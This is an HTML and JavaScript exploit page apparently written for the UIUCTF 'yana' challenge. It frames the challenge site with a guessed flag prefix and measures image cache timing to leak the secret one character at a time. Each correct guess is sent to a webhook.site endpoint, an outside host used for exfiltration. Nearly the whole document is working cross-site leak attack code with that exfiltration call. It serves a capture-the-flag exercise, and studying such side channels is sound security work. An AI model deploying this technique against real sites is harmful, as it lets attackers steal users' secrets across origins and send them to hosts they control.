<!--
    This would be a PHP in fact. I would use it to coordinate a complete brute-force.
    At the end I just used plain HTML and modified the brute-force (python) manually with new findinds.
    Lazy me.
-->
<html>
    <head>
        <script> 
            function runTest(param) {
                // Wait for the iframe to load (500ms)
                setTimeout(() => {

                    // image to load for correct letter 
                    img_url = 'https://sigpwny.com/uiuctf/y.png';

                    // image to report (exfiltration)
                    wh_url = 'https://webhook.site/some_id';

                    var start = window.performance.now();

                    // Load the 'Y' image
                    fetch(img_url, {'mode': 'cors', 'cache': 'force-cache'}).then(response => {
                        var end = window.performance.now();
                        var timing = end - start;

                        // Avg timing cached: < 10 ms
                        // Avg timing non-cached: > 30 ms
                        if (timing < 10) {
                            /* 
                                If 'y' cached, correct char guess! Report the char!
                                If the guess is correct, the next try should include the last correct.
                                #uiuctf{y
                                #uiuctf{y0
                                #uiuctf{y0u...
                            */
                            fetch(wh_url + '/yanastats?status=' + response.status + '&time=' + timing + '&key=' + encodeURIComponent(param));
                        }
                    });
                    }, 500);
            }
        </script>
    </head>
    <body>
        <iframe id="ifr" src="about:blank"></iframe><br/>
        <script>
            // Use the hash to get the test and send to the iframe
            const param = window.location.hash.substring(1);

            // Load iframe with the guess https://chal.yana.wtf/#uiuctf{y0u_<next char>
            document.getElementById("ifr").src = "https://chal.yana.wtf/#" + param;

            // Check the timing of the 'y' image
            runTest(param);
        </script>
    </body>
</html>